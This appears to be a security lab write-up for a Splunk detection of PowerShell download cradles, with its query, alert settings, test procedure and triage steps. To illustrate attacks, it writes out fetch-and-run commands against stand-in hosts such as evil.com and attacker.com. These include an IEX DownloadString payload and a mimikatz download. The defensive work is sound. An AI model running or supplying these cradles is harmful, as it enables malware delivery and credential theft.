# Detection 03: PowerShell Download Cradle

## What This Detects
PowerShell commands that download files or content from the internet. This technique is commonly used by attackers to retrieve malware, tools, or additional payloads after initial compromise. Downloading from the internet via PowerShell is often the second stage of an attack (after initial access). It indicates active threat actor behavior and potential malware delivery.

## MITRE ATT&CK Mapping
- **Tactic** : Command and Control (TA0011) 
- **Technique** : Ingress Tool Transfer (T1105)
- **Description** : Adversaries may transfer tools or files from external systems

Invoke-WebRequest -Uri

## Detection Logic
```
index=powershell EventCode=4104
| search ScriptBlockText="*Invoke-WebRequest*" OR ScriptBlockText="*DownloadString*" OR ScriptBlockText="*DownloadFile*"
| table _time, User, ComputerName, ScriptBlockText
```

**Detection Pattern:**
This search looks for common PowerShell download methods:

1. **Invoke-WebRequest** - Native PowerShell cmdlet for HTTP requests
```powershell
   Invoke-WebRequest -Uri "http://evil.com/malware.exe" -OutFile "malware.exe"
```

2. **DownloadString** - .NET WebClient method (fileless)
```powershell
   (New-Object Net.WebClient).DownloadString("http://evil.com/script.ps1")
```

3. **DownloadFile** - .NET WebClient method (saves to disk)
```powershell
   (New-Object Net.WebClient).DownloadFile("http://evil.com/tool.exe", "C:\temp\tool.exe")
```

## Alert Configuration
| **Schedule** : Every 5 minutes (`*/5 * * * *`)
| **Trigger** : For Each Result
| **Throttle Field** : User
| **Throttle Duration** : 15 minutes
| **Severity** : High

## Test Procedure

```powershell
# Downloads Google homepage
Invoke-WebRequest -Uri "https://www.google.com" -OutFile "test.html"

# Cleanup
Remove-Item test.html -ErrorAction SilentlyContinue
```

**What gets logged:**  
PowerShell Script Block (Event ID 4104) captures the full `Invoke-WebRequest` command with the URL and parameters.

## Attack Scenarios This Detects

### Scenario 1: Malware Download
```powershell
Invoke-WebRequest -Uri "http://malicious-site.com/ransomware.exe" -OutFile "C:\temp\malware.exe"
.\C:\temp\malware.exe
```

### Scenario 2: Fileless Attack (Living off the Land)
```powershell
IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/payload.ps1")
```

### Scenario 3: Tool Transfer (Post-Exploitation)
```powershell
(New-Object Net.WebClient).DownloadFile("http://c2server.com/mimikatz.exe", "C:\Windows\Temp\m.exe")
```

## Results

- PowerShell download commands captured in `powershell` index
- Alert triggered when download methods detected
- Full command visible including URL and file paths
- Throttling prevents duplicate alerts from same user
- Both legitimate and malicious downloads detected

---

## Screenshots

- [Alert Details](./screenshots/01-alert-details.png)
- [Alert Triggered](./screenshots/02-alert-triggered.png)
- [Search Results with Download Command](./screenshots/03-search-results.png)
- [Raw Event Log](./screenshots/04-event-log.png)

---

## Investigation Steps

When this alert fires:

1. **Review the URL:**
   - Known good domain? (microsoft.com, github.com)
   - Suspicious/unknown domain?
   - IP address instead of domain name? (high risk)

2. **Check the user:**
   - Authorized admin
   - Regular user (shouldn't be downloading)
   - Service account (unexpected behavior)

3. **Examine the file path:**
   - System directory? (C:\Windows\System32)
   - Temp folder? (suspicious)
   - User profile? (may be legitimate)

4. **Correlate with other alerts:**
   - Did this follow encoded PowerShell execution?
   - Are there subsequent process creation events?
   - Network connections to suspicious IPs?

5. **Check VirusTotal/URLhaus:**
   - Paste the URL into threat intelligence feeds
   - Check for known malicious indicators

## False Positive Considerations

**Legitimate uses of PowerShell downloads:**
- Windows Update scripts
- Software deployment/patching
- Automated backups to cloud storage
- Security tool updates (Defender, AV)

**Tuning recommendations:**
- Whitelist known good URLs (microsoft.com, windows.com)
- Whitelist specific service accounts used for automation
- Review patterns over 24-48 hours before tuning

## Why This Detection Matters

**Download cradles are a critical phase in the attack chain:**

Initial Access → Execution → Download Tools(This detection falls here) → Persistence → Lateral Movement
                             
Detecting downloads allows you to:
- Stop attacks before malware executes
- Identify command-and-control (C2) infrastructure
- Prevent lateral movement
- Contain the incident early

## Related Detections

This detection works best when combined with:
- Detection 02: Encoded PowerShell (often used together)
- Detection 04: LOLBin Execution (what runs after download)
- Network monitoring for outbound connections
- File creation monitoring (Sysmon Event ID 11)

## Additional Notes

**PowerShell remoting:**  
If attackers use PowerShell remoting, downloads may occur on remote systems. We need to monitor all endpoints, not just directly compromised machines.

**Alternate download methods:**  
This detection focuses on PowerShell. Other download methods exist:
- certutil.exe -urlcache (covered in LOLBin detection)
- bitsadmin.exe
- curl.exe / wget.exe
- SMB file transfers

Consider adding separate detections for these techniques.
